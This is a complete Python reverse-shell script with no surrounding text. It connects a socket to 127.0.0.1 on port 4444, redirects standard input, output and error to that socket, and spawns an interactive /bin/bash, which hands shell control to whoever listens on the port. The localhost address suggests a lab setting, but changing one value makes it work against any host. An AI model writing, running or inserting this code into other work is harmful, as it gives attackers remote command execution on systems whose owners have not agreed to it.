import socket
import pty
import os
s = socket.socket()
cnt = {
  "ip":"127.0.0.1","port":4444
}
s.connect((cnt["ip"],cnt["port"]))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
